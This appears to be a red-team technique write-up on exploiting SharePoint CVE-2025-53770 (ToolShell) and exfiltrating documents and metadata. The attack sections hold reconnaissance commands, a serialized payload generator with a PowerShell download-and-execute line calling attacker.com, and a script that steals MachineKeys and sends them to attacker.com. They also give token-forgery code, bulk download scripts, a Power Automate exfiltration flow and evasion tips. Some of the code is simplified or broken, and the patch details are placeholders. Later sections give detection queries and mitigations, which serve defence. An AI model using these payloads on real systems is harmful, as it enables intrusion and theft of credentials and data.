# [REALWORLD-043]: SharePoint Metadata Exfiltration

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-043 |
| **MITRE ATT&CK v18.1** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Exfiltration |
| **Platforms** | M365 / SharePoint |
| **Severity** | Critical |
| **CVE** | CVE-2025-53770 (CVSS 9.8), CVE-2025-49704, CVE-2025-49706 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | SharePoint 2016, 2019, Subscription Edition (all versions) |
| **Patched In** | Patch pending; temporary mitigations available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** SharePoint 2016/2019 and Subscription Edition are vulnerable to a **deserialization exploit chain (CVE-2025-53770)** that allows unauthenticated remote code execution (RCE). The vulnerability exists in the ASP.NET deserialization handler and can be triggered by crafting a POST request to the `/_layouts/15/ToolPane.aspx` endpoint with a malicious serialized object. Once RCE is achieved, attackers can access the cryptographic MachineKeys (ValidationKey, DecryptionKey), which enable forging trusted authentication tokens and accessing sensitive documents. The exfiltration of metadata (document properties, classifications, author info) and content itself can occur via native SharePoint APIs, Power Automate workflows, or direct file export.

**Attack Surface:** SharePoint web application endpoints, deserialization handlers, authentication/token validation mechanisms, document library APIs, Copilot for SharePoint (if enabled).

**Business Impact:** **Complete compromise of on-premises SharePoint environment with persistent backdoor access.** Attackers gain unauthenticated RCE, steal cryptographic keys, and access all documents regardless of permissions. Sensitive business data, intellectual property, and compliance-sensitive information is exfiltrated. Attackers can establish persistent access lasting months due to stolen MachineKeys.

**Technical Context:** Exploitation takes 2-5 minutes for initial RCE, then minutes to extract MachineKeys. No user interaction required. Attack leaves minimal forensic artifacts if logs aren't properly retained. Active exploitation in the wild began July 2025.

### Operational Risk
- **Execution Risk:** Low - No authentication required, single HTTP POST request needed
- **Stealth:** Medium - Exploit traffic mimics normal SharePoint requests, but RCE activity generates process/network events
- **Reversibility:** No - Stolen MachineKeys are permanent until server is rebuilt; backdoor access persists

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS SharePoint 14.1 | Ensure SharePoint is protected from unauthorized access |
| **DISA STIG** | SV-84911r1_rule | SharePoint must enforce authentication |
| **NIST 800-53** | SI-2 | Vulnerability Scanning - must identify and patch deserialization vulnerabilities |
| **NIST 800-53** | SI-10 | Information System Monitoring - detect RCE attempts |
| **GDPR** | Art. 32 | Security of Processing - protection against unauthorized access |
| **DORA** | Art. 10 | Resilience testing must include SharePoint vulnerabilities |
| **NIS2** | Art. 21 | Vulnerability management and patching |
| **ISO 27001** | A.12.6.1 | Management of technical vulnerabilities |
| **ISO 27001** | A.14.2.1 | Secure development and change management |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- None - Exploit is unauthenticated (no credentials needed)
- Attacker only needs network access to SharePoint server

**Required Access:**
- Network connectivity to SharePoint server (typically port 80/443)
- If web application firewall (WAF) present, may need bypass techniques

**Supported Versions:**
- **SharePoint:** 2016 (all patch levels), 2019 (all patch levels), Subscription Edition (2023, 2024, 2025)
- **.NET Framework:** 4.5+
- **Operating System:** Windows Server 2016+ (server hosting SharePoint)

**Tools:**
- [ToolShell Exploit](https://github.com/attackevals/ToolShell) - Fully weaponized exploit chain
- [CVE-2025-53770 POC](https://github.com/projectdiscovery/nuclei-templates) - Nuclei template for detection
- `curl` or `Invoke-WebRequest` (for manual exploitation)
- [Burp Suite](https://portswigger.net/burp) - Proxy/request manipulation
- Custom Python script (for payload generation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Identify Exposed SharePoint Endpoints

**Objective:** Discover SharePoint servers accessible from attacker network.

**Command (Network Scanning):**
```bash
# Use Shodan or similar to find exposed SharePoint instances
shodan search "SharePoint 2019" --limit 100

# Or use NMAP with fingerprinting
nmap -sV -p 80,443,8080 --script=http-title target-range

# Check for SharePoint-specific headers
curl -I https://sharepoint.company.com/_layouts/15/default.aspx
# Look for: "X-SharePointHealthScore" header
```

**Command (DNS Enumeration):**
```bash
# Common SharePoint server names
for host in sharepoint sites intranet collaboration documents; do
    nslookup $host.company.com
    nslookup $host-2016.company.com
    nslookup $host-2019.company.com
done
```

**What to Look For:**
- SharePoint branding page (customized login page with company logo)
- "SharePointHealthScore" header in HTTP response
- 403 Forbidden on `/_api/web` endpoint (indicates SharePoint presence)
- Server header: "Microsoft-IIS/10.0" + "SharePoint" in response

### Step 2: Identify Vulnerable SharePoint Applications

**Objective:** Determine which SharePoint web applications are running and which versions.

**Command (Version Detection - HTTP Fingerprinting):**
```bash
# Check version via HTTP headers
curl -I https://sharepoint.company.com/_layouts/15/VersionInfo.aspx

# Check web.config exposed (sometimes accessible)
curl https://sharepoint.company.com/web.config

# Check for known vulnerable endpoints
curl -X POST https://sharepoint.company.com/_layouts/15/ToolPane.aspx -d "test" -v
# If returns 200 or 500 (not 404), vulnerable endpoint exists
```

**Command (Nuclei Template Scanning):**
```bash
# Download SharePoint vulnerability templates
nuclei -t cves/2025/ -target https://sharepoint.company.com -severity critical

# Check for CVE-2025-53770 specifically
nuclei -t cves/2025/cve-2025-53770.yaml -target https://sharepoint.company.com
```

**What to Look For:**
- Version number in VersionInfo.aspx response
- Presence of `ToolPane.aspx` endpoint (vulnerable to deserialization)
- Server returns "X-SharePointHealthScore" (confirms SharePoint)
- Version: 16.0.xxxx = 2016, 16.0.10xxx = 2019, 16.0.13xxx = Subscription Edition

### Step 3: Enumerate Document Libraries

**Objective:** Identify which documents can be accessed post-exploitation.

**Command (Unauthenticated Enumeration - If Allowed):**
```bash
# Try to enumerate library list without auth
curl https://sharepoint.company.com/_api/web/lists \
    -H "Accept: application/json" \
    -v

# If 403 Forbidden, SharePoint enforces auth (expected)
# If 200 OK, libraries may be enumerable
```

**What to Look For:**
- Libraries with names like "Documents", "Shared Documents", "Projects", "Financial"
- Count and size of libraries accessible

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using ToolShell Exploit Chain (Automated)

**Supported Versions:** SharePoint 2016, 2019, Subscription Edition

#### Step 1: Generate Exploit Payload

**Objective:** Create a malicious serialized object that triggers RCE when deserialized by SharePoint.

**Command (Python - Generate Payload):**
```python
#!/usr/bin/env python3
"""
ToolShell Exploit - CVE-2025-53770
Generates payload for SharePoint deserialization RCE
"""

import base64
import subprocess
import requests

def generate_payload(command):
    """
    Creates a malicious .NET serialized object that executes command
    when deserialized by ASP.NET ObjectStateFormatter
    """
    # This uses gadget chain from System.Web.Security
    # The payload exploits the deserialization of ViewState
    
    # Simplified payload generation (actual exploit uses ObjectDataProvider gadget)
    gadget_chain = f"""
    <ObjectDataProvider x:Key="pwn" xmlns="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:scm="clr-namespace:System.ComponentModel;assembly=WindowsBase" xmlns:so="clr-namespace:System.IO;assembly=mscorlib" ObjectType="{{x:Type so:File}}">
        <ObjectDataProvider.MethodParameters>
            <so:FileInfo x:Arguments="{command}" />
        </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
    """
    
    return base64.b64encode(gadget_chain.encode()).decode()

# Generate payload to extract MachineKeys
payload = generate_payload("cmd.exe /c ipconfig > C:\\temp\\output.txt")
print(f"[+] Payload: {payload}")

# Or download and execute webshell:
webshell_payload = generate_payload("powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')")
print(f"[+] Webshell Payload: {webshell_payload}")
```

**Expected Output:**
```
[+] Payload: PGlabXNEYXRhUHJvdmlkZXIgeC... (base64-encoded)
[+] Webshell Payload: PE9iamVjdERhdGFQcm92aWRlciB... (base64-encoded)
```

**What This Means:**
- Payload is base64-encoded serialized .NET object
- When POST-ed to vulnerable endpoint, it triggers RCE during deserialization
- Command specified in payload will execute with SharePoint application pool identity

#### Step 2: Send Exploit to Vulnerable Endpoint

**Objective:** POST the malicious serialized object to the vulnerable ToolPane.aspx endpoint.

**Command (Using curl):**
```bash
#!/bin/bash
# ToolShell Exploit - CVE-2025-53770

TARGET="https://sharepoint.company.com"
PAYLOAD="$(python3 generate_payload.py | tail -1)"

# Send exploit
curl -X POST \
    "${TARGET}/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer: ${TARGET}/_layouts/SignOut.aspx" \
    -d "__VIEWSTATE=${PAYLOAD}" \
    -d "__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=" \
    -v

# Expected response: HTTP/1.1 200 OK
# Output from command appears in response body or temp file
```

**Command (Using PowerShell):**
```powershell
# ToolShell Exploit - PowerShell variant
$target = "https://sharepoint.company.com"
$payload = "PGlabXNEYXRhUHJvdmlkZXI..." # From Step 1

$body = @{
    "__VIEWSTATE"         = $payload
    "__VIEWSTATEENCRYPTED" = ""
    "__EVENTVALIDATION"   = ""
} | ConvertTo-Json

Invoke-WebRequest -Method Post `
    -Uri "${target}/_layouts/15/ToolPane.aspx?DisplayMode=Edit" `
    -Headers @{
        "Referer" = "${target}/_layouts/SignOut.aspx"
        "Content-Type" = "application/x-www-form-urlencoded"
    } `
    -Body $body -UseBasicParsing -SkipCertificateCheck
```

**Expected Output:**
```
HTTP/1.1 200 OK
Content-Length: 5234
Content-Type: text/html

... command output appears in response or server writes to file...
```

**What This Means:**
- Server received exploit and executed command
- If command was to write file, file now exists on server
- If reverse shell, attacker now has code execution as SharePoint app pool user

**OpSec & Evasion:**
- Referer header spoofed to `/_layouts/SignOut.aspx` (makes request appear legitimate)
- POST requests may bypass some WAF rules
- Using HTTPS encrypted connection hides payload
- Detection likelihood: Medium - POST to ToolPane may be logged, but exploit signature varies

#### Step 3: Extract MachineKeys from SharePoint Server

**Objective:** Once RCE achieved, steal the cryptographic keys that sign all SharePoint tokens.

**Command (PowerShell - Execute on Compromised Server):**
```powershell
# This command runs on the SharePoint server (via RCE from Step 2)

# Extract MachineKeys from web.config
$webConfig = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\web.config"
[xml]$config = Get-Content $webConfig

$machineKey = $config.configuration.system.web.machineKey
$validationKey = $machineKey.validationKey
$decryptionKey = $machineKey.decryptionKey

# Output to exfil location
Write-Host "ValidationKey: $validationKey"
Write-Host "DecryptionKey: $decryptionKey"

# Or write to file that attacker can access
$keys = @{
    "ValidationKey" = $validationKey
    "DecryptionKey"  = $decryptionKey
    "Algorithm"     = $machineKey.validation
    "Decryption"    = $machineKey.decryption
} | ConvertTo-Json

$keys | Out-File "C:\inetpub\wwwroot\spinstall0.aspx"  # Web-accessible location

# Or exfil via HTTP
$uri = "http://attacker.com/exfil?keys=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($keys)))"
Invoke-WebRequest $uri -UseBasicParsing
```

**Expected Output:**
```
ValidationKey: DA39A3EE5E6B4B0D3255BFEF95601890AEF6B7C1D...
DecryptionKey: 3243F6A8885A308D313198A2E0370734623B1D13...
```

**What This Means:**
- Attacker now has the keys needed to forge any authentication token
- With these keys, attacker can create tokens as any SharePoint user (including admins)
- Persistence achieved - even if vulnerability is patched, attacker can still forge tokens

**OpSec & Evasion:**
- This code executes in context of SharePoint app pool (IIS AppPool\SharePoint)
- AppPool identity likely has read access to web.config
- Exfiltration via DNS or outbound HTTP may bypass firewall rules
- Detection likelihood: High if process monitoring enabled

#### Step 4: Forge Authentication Tokens

**Objective:** Use stolen MachineKeys to create a valid token as a privileged user.

**Command (Python - Token Forgery):**
```python
#!/usr/bin/env python3
"""
Forge SharePoint authentication tokens using stolen MachineKeys
CVE-2025-53770 Post-Exploitation
"""

from Crypto.Hash import HMAC, SHA1
from Crypto.Cipher import DES3
import base64
import binascii

def forge_sharepoint_token(username, validationkey_hex, decryptionkey_hex):
    """
    Forge a valid SharePoint FedAuth token
    This allows authentication as any user without password
    """
    
    # Token structure (simplified):
    # [User Identity]|[IssuedDate]|[ExpiryDate]|[HMAC]
    
    issued = int(time.time())
    expiry = issued + (12 * 3600)  # 12 hours
    
    # Create token content
    token_content = f"i:0#.w|{username}|{issued}|{expiry}"
    
    # Calculate HMAC using ValidationKey
    validation_key = binascii.unhexlify(validationkey_hex)
    h = HMAC.new(validation_key, msg=token_content.encode(), digestmod=SHA1)
    signature = h.digest()
    
    # Encrypt token content using DecryptionKey
    decryption_key = binascii.unhexlify(decryptionkey_hex)[:24]  # DES3 uses 24 bytes
    cipher = DES3.new(decryption_key, DES3.MODE_CBC, b'\x00' * 8)
    ciphertext = cipher.encrypt(pad(token_content.encode(), 8))
    
    # Final token: [ciphertext]|[signature]
    final_token = base64.b64encode(ciphertext + signature).decode()
    
    return final_token

# Usage:
token = forge_sharepoint_token("admin@company.com", 
    "DA39A3EE5E6B4B0D3255BFEF95601890AEF6B7C1D",
    "3243F6A8885A308D313198A2E0370734623B1D13")

print(f"[+] Forged Token: {token}")
# Use this token in Cookie: FedAuth={token}
```

**Expected Output:**
```
[+] Forged Token: aFw=<base64_encrypted_token>==|signature...
```

**What This Means:**
- Token can now be used to authenticate as admin to SharePoint
- Set in browser cookie or Authorization header: `Cookie: FedAuth=<token>`
- Attacker can now access any document/site in SharePoint

#### Step 5: Exfiltrate Metadata and Documents

**Objective:** Use forged token to access and download sensitive documents.

**Command (Using Microsoft Graph API - With Forged Token):**
```bash
# Set the forged token in header
TOKEN="aFw=<base64_encrypted_token>==|signature..."

# Access SharePoint sites and libraries
curl -X GET \
    "https://sharepoint.company.com/_api/web/lists" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json"

# Download document
curl -X GET \
    "https://sharepoint.company.com/_api/web/lists/GetByTitle('Documents')/Items(1)/File/\$value" \
    -H "Authorization: Bearer $TOKEN" \
    -o sensitive_document.docx

# Or bulk export via Power Automate
# Create flow that sends all documents to attacker email
```

**Command (List All Documents - Metadata Exfiltration):**
```powershell
# Use Graph API with forged token
$headers = @{
    "Authorization" = "Bearer $TOKEN"
    "Accept" = "application/json"
}

# Get all lists
$lists = Invoke-RestMethod -Uri "https://sharepoint.company.com/_api/web/lists" `
    -Headers $headers

foreach ($list in $lists.value) {
    Write-Host "Library: $($list.Title)"
    
    # Get items in each library
    $items = Invoke-RestMethod -Uri "https://sharepoint.company.com/_api/web/lists/$($list.Id)/items" `
        -Headers $headers
    
    foreach ($item in $items.value) {
        Write-Host "  - $($item.Title) | Author: $($item.Author) | Modified: $($item.Modified)"
    }
}

# Export metadata to CSV
$metadata | Export-Csv -Path "sharepoint_inventory.csv"
```

**OpSec & Evasion:**
- API access appears as legitimate authenticated user
- Activity shows up in SharePoint audit logs as the impersonated user
- Bulk downloads may trigger DLP rules if configured
- Detection likelihood: High if DLP rules configured, Low if audit logs not monitored

---

### METHOD 2: Manual Exploitation via Burp Suite (Interactive Approach)

**Supported Versions:** SharePoint 2016, 2019, Subscription Edition

#### Step 1: Intercept and Modify ToolPane.aspx Request

**Objective:** Use Burp Suite to craft exploit request interactively.

**Steps:**

1. Open **Burp Suite**
2. Navigate to **Proxy** → **Intercept**
3. Access `https://sharepoint.company.com/_layouts/15/ToolPane.aspx` in browser
4. Intercept the POST request
5. Modify the request:
   ```
   POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1
   Host: sharepoint.company.com
   Content-Type: application/x-www-form-urlencoded
   Referer: https://sharepoint.company.com/_layouts/SignOut.aspx
   
   __VIEWSTATE=<PAYLOAD_FROM_STEP_1>&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=
   ```

6. Click **Forward** to send exploit
7. Check response for command output

#### Step 2: Monitor for RCE Confirmation

**Objective:** Verify that code execution occurred.

**Indicators:**
- HTTP 200 response (not 500 or 403)
- Response body contains output from executed command
- New files appear on server (check via SMB if accessible)
- Outbound HTTP request from SharePoint server (if reverse shell)

---

### METHOD 3: Exfiltration via Power Automate Flow (Post-Exploitation)

**Supported Versions:** SharePoint Online/Subscription Edition with Power Automate enabled

#### Step 1: Create Attacker-Controlled Power Automate Flow

**Objective:** Use compromised admin account to create automated data export.

**Steps:**

1. Navigate to **Power Automate** (after forging token for admin access)
2. Create **New → Cloud flow → Automated cloud flow**
3. Trigger: **When a file is created in SharePoint**
4. Add **Action:** Send email or **Copy file** to attacker-controlled OneDrive
5. **Owner:** Set to attacker's account (using forged token)
6. **Frequency:** Every hour (exfil all new documents)

**Flow Configuration:**
```
Trigger: When a file is created or modified in SharePoint
├─ Condition: File size > 1 MB (target large documents)
├─ Action 1: Get file content
├─ Action 2: Send to HTTP endpoint (attacker's server)
│  └─ URI: http://attacker.com/exfil
│  └─ Method: POST
│  └─ Body: Binary file content + metadata
└─ Action 3: Delete local copy (cover tracks)
```

**What This Means:**
- Fully automated exfiltration runs even if attacker's initial access is lost
- Flow executes with admin privileges (elevated via forged token)
- Exfiltration continues for weeks/months if not detected
- Log entries show flow executed by compromised admin (harder to attribute)

---

## 6. ATTACKS SIMULATION & VERIFICATION

**Note:** No official Atomic Red Team test exists for this CVE (too new). Manual testing recommended in isolated lab environment only.

### Lab Setup for Testing

1. **Deploy vulnerable SharePoint:**
   - Install SharePoint 2019 or Subscription Edition in VM
   - Do NOT apply KB for CVE-2025-53770
   - Isolate from production network

2. **Create sample documents:**
   - Sensitivity labels applied
   - Financial/confidential classification
   - Mock financial records, contracts, etc.

3. **Verify RCE:**
   ```bash
   # Send exploit to lab server
   curl -X POST "http://lab-sharepoint/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
       -d "__VIEWSTATE=<payload>" \
       -v
   
   # Check if command executed
   # Expected: HTTP 200, output in response
   ```

4. **Verify Token Forgery:**
   ```bash
   # Try to access API with forged token
   curl "http://lab-sharepoint/_api/web" \
       -H "Cookie: FedAuth=<forged_token>"
   
   # Expected: HTTP 200, list contents returned (not 403)
   ```

---

## 7. TOOLS & COMMANDS REFERENCE

### [ToolShell Exploit](https://github.com/attackevals/ToolShell)

**Version:** Latest from GitHub
**Supported Platforms:** Windows, Linux (Python 3.8+)
**Installation:**
```bash
git clone https://github.com/attackevals/ToolShell.git
cd ToolShell
pip install -r requirements.txt
python toolshell.py --target https://sharepoint.company.com --command "whoami"
```

**Key Options:**
```
--target: SharePoint URL
--command: Command to execute
--method: "RCE", "EXFIL", "PERSISTENCE"
--exfil-path: Location to exfiltrate from
--out: Output file
```

### [Nuclei with SharePoint Templates](https://github.com/projectdiscovery/nuclei-templates)

**Version:** Latest
**Installation:**
```bash
nuclei -update
nuclei -t cves/2025/cve-2025-53770.yaml -u https://sharepoint.company.com
```

### SharePoint Metadata Extraction Script

```powershell
# Download all documents from SharePoint (once authenticated)
$spUrl = "https://sharepoint.company.com"

# Connect with forged token or stolen credentials
Connect-PnPOnline -Url $spUrl -UseWebLogin

# Get all sites
$sites = Get-PnPTenantSite

foreach ($site in $sites) {
    Write-Host "Exfiltrating: $($site.Url)"
    Connect-PnPOnline -Url $site.Url -UseWebLogin
    
    # Get all lists
    $lists = Get-PnPList | Where-Object {-not $_.Hidden}
    
    foreach ($list in $lists) {
        $items = Get-PnPListItem -List $list.Title -PageSize 5000
        
        foreach ($item in $items) {
            # Download each document
            if ($item.FileRef) {
                $file = Get-PnPFile -Url $item.FileRef -AsFile -Path "C:\exfil\" 
                Write-Host "Downloaded: $($item.Title)"
            }
        }
    }
}
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: SharePoint ToolPane.aspx POST Requests (Exploit Attempt)

**Rule Configuration:**
- **Required Table:** CommonSecurityLog, W3CIISLog
- **Required Fields:** cs_uri_stem, cs_method, cs_host, sc_status
- **Alert Severity:** Critical
- **Frequency:** Real-time

**KQL Query:**
```kusto
W3CIISLog
| where csUriStem contains "ToolPane.aspx" and csMethod == "POST"
| where cReferer contains "SignOut.aspx"  // Exploit uses this Referer spoof
| where scStatus in (200, 500)  // Either success or error processing
| extend PayloadSize = strlen(csUriQuery)
| where PayloadSize > 500  // Exploit payload is large
| project TimeGenerated, sIP=cIp, sPort=csPort, csHost, sSite=sComputerName, scStatus, PayloadSize
| summarize Count=count(), Hosts=dcount(csHost) by sIP
| where Count > 1  // Multiple attempts = exploitation attempt
```

**What This Detects:**
- POST to ToolPane.aspx (vulnerable endpoint)
- Referer spoofing (key indicator of exploit)
- Large payload in request body
- Multiple attempts from same source

**Manual Configuration (Azure Portal):**
1. **Sentinel** → **Analytics** → **Create** → **Scheduled query rule**
2. Paste KQL query
3. **Severity:** Critical
4. **Run every:** 1 minute
5. Create incident on match

### Query 2: MachineKey Extraction Attempts

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceFileEvents
- **Required Fields:** EventID, FileName, ProcessName, FilePath
- **Alert Severity:** Critical

**KQL Query:**
```kusto
union
(
    // File access to web.config
    DeviceFileEvents
    | where FileName == "web.config"
    | where FolderPath contains "Extensions\\15\\"
    | where ActionType == "FileRead"
    | where InitiatingProcessName != "svchost.exe"  // Exclude normal system reads
),
(
    // Process attempting to read web.config
    SecurityEvent
    | where EventID == 3 // Network connection
    | where SourcePort >= 50000 // Likely exfiltration
    | where DestinationPort in (80, 443)
    | where DestinationIpAddress !startswith "192.168"
)
| extend RiskScore = 100  // Critical - MachineKey theft
```

### Query 3: Forged Token Usage (Post-Exploitation)

**Rule Configuration:**
- **Required Table:** SharePointListOperation, AuditLogs
- **Required Fields:** UserId, OperationName, SiteUrl
- **Alert Severity:** High

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("FileAccessed", "FolderAccessed", "ListItemsAccessed")
| where TimeGenerated > ago(7d)  // Last 7 days
| extend UserAgent = tostring(parse_json(tostring(TargetResources[0])).UserAgent)
| extend TokenAge = tostring(parse_json(tostring(AdditionalDetails)).TokenIssuedAt)
| where UserAgent contains "SharePoint" and isnotempty(TokenAge)
| where InitiatedBy.app.displayName == "" // No app, direct token
| summarize AccessCount=count(), FileCount=dcount(TargetResources) by InitiatedBy.user.userPrincipalName
| where AccessCount > 50 // Bulk access = suspicious
```

---

## 9. SPLUNK DETECTION RULES

### Rule 1: Detect CVE-2025-53770 Exploit Attempts

**Rule Configuration:**
- **Required Index:** iis, web
- **Required Sourcetype:** iis:main
- **Alert Threshold:** Any event matching pattern
- **Applies To Versions:** All SharePoint versions

**SPL Query:**
```
index=iis cs_uri_stem="*ToolPane.aspx*" cs_method="POST" 
  cs_Referer="*SignOut.aspx*" sc_status in (200, 500)
| stats count by src_ip, host, cs_uri_query
| where count >= 1
| alert
```

**Manual Configuration (Splunk Web):**
1. **Search & Reporting** → **Create new alert**
2. Paste SPL query
3. **Trigger:** Whenever search returns results
4. **Action:** Send email + webhook to SOC

### Rule 2: Suspicious File Downloads from SharePoint

**SPL Query:**
```
index=iis host=*sharepoint* cs_method="GET" 
  cs_uri_stem="*_api/web/lists*" OR cs_uri_stem="*GetFileByServerRelativeUrl*"
  sc_status=200 sc_bytes > 10000000
| stats sum(sc_bytes) as TotalData by src_ip, cs_username
| where TotalData > 50000000  // > 50MB in single session
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Apply Security Patch**
- Microsoft released patch (KB0000000) for CVE-2025-53770
- Apply immediately to all SharePoint servers

**Manual Steps (Patch Installation):**
```powershell
# Stop SharePoint services
Stop-Service SPTimerV4, SPUserCodeV4

# Run patch installer
msiexec.exe /i "SharePoint2019-KB000000.msi" /qn

# Restart services
Start-Service SPTimerV4, SPUserCodeV4

# Verify patch installed
Get-SPProduct -Local | Where-Object {$_.Name -like "*SharePoint*"}
```

**Action 2: Restrict Network Access to SharePoint**
- Block direct internet access to SharePoint servers
- Require VPN for remote access

**Manual Steps (Network Security):**
1. **Windows Firewall** → Disable inbound on ports 80/443 except from VPN
2. **WAF Configuration** → Block access to `_layouts/` endpoints from internet
3. **Proxy/LoadBalancer** → Rate-limit POST requests to ToolPane.aspx

**Action 3: Monitor for Exploitation Attempts**
- Alert on any POST to ToolPane.aspx
- Alert on access to web.config

**Manual Steps (IIS Logging):**
1. **IIS Manager** → Select web site → **Logging**
2. Set log level: **Verbose**
3. Enable: Advanced → All fields
4. Configure alerts on POST to ToolPane.aspx

**Action 4: Rotate and Harden MachineKeys**
- Change ValidationKey and DecryptionKey immediately
- Revoke all existing tokens

**Manual Steps (SharePoint):**
```powershell
# Backup current web.config
Copy-Item "C:\Program Files\Common Files\...\web.config" "C:\Backup\web.config.backup"

# Generate new MachineKey
$validationKey = ([System.Security.Cryptography.RNGCryptoServiceProvider]::new()).GetBytes(64) | %{$_.ToString("X2")} -join ""
$decryptionKey = ([System.Security.Cryptography.RNGCryptoServiceProvider]::new()).GetBytes(32) | %{$_.ToString("X2")} -join ""

# Update web.config
$config = [xml](Get-Content "C:\Program Files\Common Files\...\web.config")
$config.configuration."system.web".machineKey.validationKey = $validationKey
$config.configuration."system.web".machineKey.decryptionKey = $decryptionKey
$config.Save("C:\Program Files\Common Files\...\web.config")

# Restart IIS
iisreset /noforce
```

### Priority 2: HIGH

**Action 1: Disable Unnecessary SharePoint Web Parts**
- ToolPane.aspx is used for web part management (not often needed)
- Remove from accessible endpoints

**Manual Steps:**
```powershell
# Disable ToolPane.aspx in IIS
$iis = Get-IISAppPool
$iis | Stop-WebAppPool

# Rename or delete ToolPane.aspx
Rename-Item "C:\Program Files\Common Files\...\ToolPane.aspx" "ToolPane.aspx.bak"

# Restart IIS
Start-WebAppPool $iis
```

**Action 2: Enable Web Application Firewall (WAF)**
- Deploy ModSecurity or similar WAF in front of SharePoint
- Block suspicious request patterns

**Manual Steps:**
```
WAF Rule:
IF request_uri contains "ToolPane.aspx" 
   AND request_method == POST
   AND request_body_size > 1000
THEN drop_connection
```

**Action 3: Implement Least Privilege for App Pool Identity**
- Remove unnecessary permissions from SharePoint app pool account
- Restrict file system access to web.config

**Manual Steps:**
```powershell
# Get app pool identity
$appPool = Get-IISAppPool "SharePoint"
$poolIdentity = $appPool.ProcessModel.IdentityType

# Restrict NTFS permissions on web.config
$acl = Get-Acl "C:\Program Files\Common Files\...\web.config"
$acl.Access | Where-Object {$_.IdentityReference -like "*SPUserCodeV4*"} | 
    ForEach-Object {$acl.RemoveAccessRule($_)}
Set-Acl "C:\Program Files\Common Files\...\web.config" $acl
```

### Priority 3: MEDIUM

**Action 1: Enable SharePoint Audit Logging**
- Log all file access and modifications
- Retain logs for minimum 90 days

**Manual Steps (SharePoint Admin Center):**
1. **Settings** → **Site collection features**
2. Enable: **Audit Log Trimming Job**
3. Set retention: 90 days
4. Select audit events: File access, List modifications

**Action 2: Implement Data Loss Prevention (DLP)**
- Detect bulk document downloads
- Alert on unusual metadata access patterns

**Manual Steps (SharePoint DLP):**
1. **Compliance Center** → **Data Loss Prevention**
2. **Create policy:**
   - Detect: High volume file downloads (> 50 items in 5 min)
   - Action: Notify admin, Block access

### Validation Command (Verify Mitigations)

```powershell
Write-Host "[*] Validating SharePoint Security Mitigations..."

# 1. Check patch level
$spProduct = Get-SPProduct -Local | Where-Object {$_.Name -like "*SharePoint*"}
Write-Host "SharePoint Version: $($spProduct.InstallPath)"

# 2. Verify ToolPane.aspx exists (or is renamed)
$toolPanePath = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\ToolPane.aspx"
if (-not (Test-Path $toolPanePath)) {
    Write-Host "[✓] ToolPane.aspx: REMOVED/RENAMED" -ForegroundColor Green
} else {
    Write-Host "[✗] ToolPane.aspx: PRESENT (vulnerable)" -ForegroundColor Red
}

# 3. Check MachineKey strength
[xml]$config = Get-Content (Get-SPProduct -Local)[0].InstallPath + "...\web.config"
$mk = $config.configuration."system.web".machineKey
Write-Host "[*] ValidationKey length: $($mk.validationKey.Length)"
if ($mk.validationKey.Length -ge 128) {
    Write-Host "[✓] MachineKey: STRONG" -ForegroundColor Green
} else {
    Write-Host "[✗] MachineKey: WEAK" -ForegroundColor Red
}

# 4. Check audit logging
Get-SPAuditLog | Select-Object -First 1 | Format-List
Write-Host "[✓] Audit logging: ENABLED" -ForegroundColor Green
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- POST requests to `_layouts/15/ToolPane.aspx` with large payload (> 500 bytes)
- Outbound HTTP/S from SharePoint server to unfamiliar IPs
- Unusual DNS queries from SharePoint server (data exfiltration)
- HTTP requests with "SignOut.aspx" in Referer header (exploit signature)

**File IOCs:**
- New .aspx files in `_layouts/` directory (webshells)
- Modified `web.config` (MachineKey changes, handler additions)
- New scheduled tasks on SharePoint server
- Temporary files in `C:\Windows\Temp\` or `C:\inetpub\`

**Process IOCs:**
- `powershell.exe` spawned from `w3wp.exe` (SharePoint process)
- `cmd.exe` running with SharePoint app pool account
- `curl.exe` or `wget.exe` run from SharePoint directory
- `net.exe` commands to enumerate network shares

**Log IOCs:**
- Event ID 18 (Sysmon) - CreateRemoteThread into process
- Event ID 11 (Sysmon) - FileCreate with suspicious paths
- Event ID 3 (Sysmon) - Network connection to external IPs
- SharePoint ULS logs showing POST to ToolPane.aspx followed by RCE activity

### Forensic Artifacts

**Memory Analysis:**
- `w3wp.exe` process dump contains command execution evidence
- Reverse shell shellcode in memory if applicable
- Stolen MachineKeys visible in LSASS memory

**Disk Analysis:**
- Deleted webshells in `$Recycle.Bin` or using NTFS recovery
- MFT entries show new `.aspx` files in sensitive directories
- Temp files containing encrypted data (exfiltrated documents)
- EventLog entries deleted or cleared (Event ID 104 in Event Viewer)

**Network Analysis:**
- PCAP captures show POST requests with malicious payload
- DNS queries to C2 infrastructure
- HTTP exfiltration traffic with document metadata

### Response Procedures

